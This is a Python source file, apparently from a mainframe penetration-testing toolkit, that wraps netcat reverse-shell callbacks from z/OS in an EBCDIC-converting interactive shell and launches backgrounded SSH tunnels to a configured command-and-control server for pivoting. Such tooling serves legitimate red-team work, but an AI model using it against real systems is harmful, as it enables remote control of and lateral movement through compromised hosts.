"""Wrapper to get an interactive shell on nc-based call backs

Also provide some zos and ssh pivoting specific commands"""
import argparse
import sys
from cmd import Cmd
from configparser import ConfigParser, ExtendedInterpolation
from string import Template
from . import WrappingShell


class ReverseShellManager(WrappingShell):
    REVERSE_SH_SSH = 'ssh -i $KEYNAME $CCU@$CCS -p $CCP -o UserKnownHostsFile=$KNOWNHOSTSFILE -o StrictHostKeyChecking=yes -N '

    def __init__(self, cmdline, codepage, name='shell', sync_stdout=False, config=None):
        WrappingShell.__init__(self, cmdline, codepage, name=name, sync_stdout=sync_stdout)
        self.status_config = config['ZOS']

    def do_tsocmd(self, args):
        """Get autocomplete for tsocmd when running on zOS"""
        real_args = 'tsocmd ' + args
        self.default(real_args)

    def do__runssh(self, args):
        """Add the args options to a ssh command created from self.status_config"""
        config = self.status_config
        ssh_step = Template(self.REVERSE_SH_SSH).substitute(
                KEYNAME=config['ftpkeyname'],
                KNOWNHOSTSFILE=config['ftpknownhosts'],
                CCU=config['cc_user'],
                CCS=config['cc_server'],
                CCP=config['cc_port'],
                NCIP=config['ebcdiccat_host'],
                NCP=config['ebcdiccat_port'],
                )
        run_ssh_command = ssh_step + args + '&'
        print('Running in background: ' + run_ssh_command)
        self.default(run_ssh_command)

if __name__ == '__main__':
    # Argument parsing
    parser = argparse.ArgumentParser(
        description='Wraps a CLI program stdin/stdout in an encoding converter')
    parser.add_argument('-e', '--encoding', type=str, help='set the encoding (default cp037)',
                        default='cp037')
    parser.add_argument('-n', '--name', type=str, help='name', default='shell')
    parser.add_argument('-a', '--asyncio', help='asynchronous IO (like netcat)',
                        default=True, action='store_false')
    subparsers = parser.add_subparsers(title='subcommand',
                                       description='external command to wrap',
                                       help='program to execute')
    command_parser = subparsers.add_parser('cmd', add_help=False)

    local_arguments, wrapped_command = parser.parse_known_args()
    wrapping_encoding = local_arguments.encoding

    if local_arguments.name is None:
        shell = ReverseShellManager(wrapped_command, wrapping_encoding,
                              sync_stdout=local_arguments.asyncio)
    else:
        shell = ReverseShellManager(wrapped_command, wrapping_encoding,
                              name=local_arguments.name,
                              sync_stdout=local_arguments.asyncio)
    shell.cmdloop()